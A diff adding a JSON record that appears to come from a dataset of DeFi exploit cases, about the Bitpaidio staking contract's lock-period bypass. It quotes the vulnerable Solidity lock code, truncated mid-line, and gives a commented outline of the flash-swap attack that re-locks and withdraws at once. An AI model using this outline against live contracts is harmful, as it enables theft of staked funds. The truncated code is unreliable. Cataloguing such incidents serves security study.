@@ -1,0 +1,27 @@
+{
+ "id": "2023__2023-05-xx_Bitpaidio_StakingLockBypass",
+ "source_file": "2023/2023-05-xx_Bitpaidio_StakingLockBypass.md",
+ "title": "Bitpaidio Exploit — Lock_Token() / withdraw() Lock Period Bypass via Flash Swap",
+ "date": "2023-01-01",
+ "protocol": "Bitpaidio",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "// File: Staking.sol\n     * CAUTION: This function is deprecated because it requires allocating memory for the error  // ❌\n\n// ...\n\n     * CAUTION: This function is deprecated because it requires allocating memory for the error  // ❌\n\n// ...\n\n    function _transferOwnership(address newOwner) internal {\n      require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n      emit OwnershipTransferred(_owner, newOwner);\n      _owner = newOwner;\n    }\n\n// ...\n\n    function Lock_Token(uint256 plan, uint256 _amount) external {  // ❌\n      if(plan == 1) {\n          address contractAddress = address(this);\n          uint256 currentAmount = sixMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(sixMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;  // ❌\n          uint256 endTime = block.timestamp + 180 days;  // ❌\n          sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);  // ❌\n          }\n          else {\n              uint256 startTime = sixMonth[msg.sender].start_time;\n              uint256 endTime = sixMonth[msg.sender].end_time;\n              sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);  // ❌\n          }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 2) {\n          address contractAddress = address(this);\n          uint256 currentAmount = nineMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n           if(nineMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;  // ❌\n          uint256 endTime = block.timestamp + 270 days;  // ❌\n          nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);  // ❌\n           }\n           else {\n              uint256 startTime = nineMonth[msg.sender].start_time;\n              uint256 endTime = nineMonth[msg.sender].end_time;\n              nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);  // ❌\n           }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 3) {\n          address contractAddress = address(this);\n          uint256 currentAmount = twelveMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(twelveMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;  // ❌\n          uint256 endTime = block.timestamp + 365 days;  // ❌\n          twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);  // ❌\n          }\n          else {\n              uint256 startTime = twelveMonth[msg.sender].start_time;\n              uint256 endTime = twelveMonth[msg.sender].end_time;\n              twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);  // ❌\n          }\n          ERC20interface.transferF"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → triggers pancakeCall() callback:"
+ ],
+ "other_code": [
+  "// 1. Staking.Lock_Token(1, 0)   // firstLock - initial position\n// 2. vm.warp(block.timestamp + 180 days)\n// 3. Pair.swap(219_349e18, 0, address(this), abi.encode(\"flash\"))\n//    → triggers pancakeCall() callback:\n//      a. IERC20(BTP).approve(address(Staking), type(uint256).max)\n//      b. Staking.Lock_Token(1, balance)   // lock inside callback\n//      c. Staking.withdraw(1)              // withdraw immediately — NO time check\n//      d. Repay flash swap: BTP.transfer(address(Pair), 219_349e18 + fee)",
+  "interface IStaking {\n    function Lock_Token(uint256 lockType, uint256 amount) external;\n    function withdraw(uint256 lockType) external;\n}\n\ninterface Uni_Pair_V2 {\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}"
+ ]
+}
